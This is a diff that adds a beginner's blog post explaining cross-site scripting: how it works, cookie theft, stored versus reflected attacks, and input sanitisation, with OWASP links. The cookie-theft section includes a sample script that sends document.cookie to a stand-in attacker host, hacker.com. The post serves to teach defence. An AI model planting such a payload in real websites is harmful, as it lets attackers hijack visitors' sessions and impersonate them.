@@ -1,0 +1,88 @@
+---
+slug: xss
+date: 2020-06-21
+title: 'Be careful of XSS attacks'
+description: 'Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites.'
+published: true
+author: 'ZBIRI Walid'
+banner: './xss-simple-tutorial.png'
+---
+# Table of contents
+1. [Introduction](#introduction)
+2. [What is Cross Site Scripting (XSS)](#paragraph1)
+3. [What can the hacker do with JavaScript scripts ?](#paragraph2)
+4. [How xss attack works ?](#paragraph4)  
+    4.1 [Stealing Cookies using XSS](#paragraph4.1)
+5. [Stored VS Reflected XSS Attacks](#paragraph5)  
+    &nbsp; 5.1 [Stored XSS Attacks](#paragraph5.1)  
+    &nbsp; 5.2 [Reflected XSS Attacks](#paragraph5.2)
+6. [Cross Site Scripting Prevention](#paragraph6) 
+7. [Wrap up](#paragraph7) 
+
+# Introduction <a name="introduction"></a>
+Hello geeks, in this blog, we will cover two famous attacks in web applications that every web developer (Backend or Frontend) should know.
+We will define XSS and CSRF attacks, then give some advices to protect your websites from this attacks.
+>> This article is just for learning purposes!
+
+
+# What is Cross Site Scripting (XSS) <a name="paragraph1"></a>
+The cross site scripting is one of the famous attacks in web apps, it's about injecting a script in your web app
+that will execute malicious commands on the client browser.  
+In the XSS attack, the hacker doesn’t target your web app in the first place. But he use it as a bridge to attack your visitors.
+# What can the hacker do with JavaScript scripts ? <a name="paragraph2"></a>
+Most web browsers run JavaScript in a very tightly controlled environment. JavaScript has limited access to the user’s operating system and the user’s files. However, JavaScript can still be dangerous if misused as part of malicious content:
+- Malicious JavaScript has access to all the objects that the rest of the web page has access to. This includes access to the user’s cookies. Cookies are often used to store session tokens. If an attacker can obtain a user’s session cookie, they can impersonate that user, perform actions on behalf of the user, and gain access to the user’s sensitive data.
+- JavaScript in modern browsers can use HTML5 APIs. For example, it can gain access to the user’s geolocation, webcam, microphone, and even specific files from the user’s file system. Most of these APIs require user opt-in, but the attacker can use social engineering to go around that limitation.
+- JavaScript can make Ajax Calls through the XMLHttpRequest object or using fetch API.
+With these functionnalities in combination with social engineering, criminals can run some advanced attacks like cookie theft, keylogging and identity theft etc ...
+# How xss attack works ? <a name="paragraph4"></a>
+In XSS attack there is 3 actors:<br/>
+1. Your website visitors<br/>
+2. Your website (Bridge)<br/>
+3. The hacker<br/>
+
+Cross-site Scripting (XSS) is a client-side code injection attack. The attacker aims to execute malicious scripts in a web browser of the victim by including malicious code in a legitimate web page or web application.  
+The actual attack occurs when the victim visits the web page or web application that executes the malicious code. The web page or web application becomes a vehicle to deliver the malicious script to the user’s browser. Vulnerable vehicles that are commonly used for Cross-site Scripting attacks are forums, message boards, and web pages that allow comments.
+
+An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site.
+## Stealing Cookies using XSS:<a name="paragraph4.1"></a>
+![cookie](./how-xss-works-910x404.png)
+Criminals usually uses XSS to steal user cookies. This allows them to impersonate the victim.
+The attacker can send the cookie to their own server in many ways. For example with injecting this peace of code:
+``` html
+<script>
+window.location="http://hacker.com/?cookie=" + document.cookie
+</script>
+```
+1- The attacker injects a payload into the website’s database by submitting a vulnerable form with malicious JavaScript content.<br/>
+2- The victim requests the web page from the web server.<br/>
+3- The web server serves the victim’s browser the page with attacker’s payload as part of the HTML body.<br/>
+4- The victim’s browser executes the malicious script contained in the HTML body. In this case, it sends the victim’s cookie to the attacker’s server.<br/>
+5- The attacker now simply needs to extract the victim’s cookie when the HTTP request arrives at the server.<br/>
+6- The attacker can now use the victim’s stolen cookie for impersonation.<br/>
+
+# Stored and Reflected XSS Attacks <a name="paragraph5"></a>
+XSS attacks can generally be categorized into two categories: stored and reflected.
+## Stored XSS Attacks (No Need for Social engineering) <a name="paragraph5.1"></a>
+![stored](./stored-xss.png)
+Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. So all your websites visitors are going to be affected by the script. The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent.
+## Reflected XSS Attacks (Need Social engineering) <a name="paragraph5.2"></a>
+![reflected](./reflected-xss.png)
+First of all what do we mean by reflected? So let's say you navigate to __www.example.com/page?main.html__ and it puts you on the main page of __example.com__. Now you navigate to the index, which is located at __www.example.com/page?index.html__. You start to wonder, what other pages are there?
+
+So you type in __www.example.com/page?foo__ and hit enter, and you get an error page which will say something like "Resource foo is not found".
+
+The thing to note here is that you put a parameter into the URL, and that parameter got reflected back to you as the user. In this case, it was the parameter "foo".
+
+Now the idea behind reflected XSS should be a bit more clear; instead of inputting a parameter like "foo", you input something like ``<script>malicious code</script>foo`` and hit enter. On a vulnerable site, that entire parameter will get injected into the error page that pops up, the javascript will execute, in addition to the "Resource foo is not found" message. If you can induce somebody else navigate to the same link that you crafted, you can execute arbitrary javascript in their session.
+# Cross Site Scripting Prevention <a name="paragraph6"></a>
+To keep yourself safe from XSS, you must sanitize your input. Your application code should never output data received as input directly to the browser without checking it for malicious code.
+
+For more details, refer to the following [cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) maintained by the OWASP organization.
+# Wrap up <a name="paragraph7"></a>
+While testing, it is highly recommended to evaluate the risks that bring possible XSS attacks. XSS attack can affect web applications, that seem to be secure as well.
+
+It is considered to be one of the most harmful and risky attacks. Hence, we should not forget this type of testing. While performing testing against XSS, it is important to have a good knowledge about this attack.
+### Useful resources:
+1. [XSS By OWASP](https://owasp.org/www-community/attacks/xss/)
+2. [XSS Prevention By OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
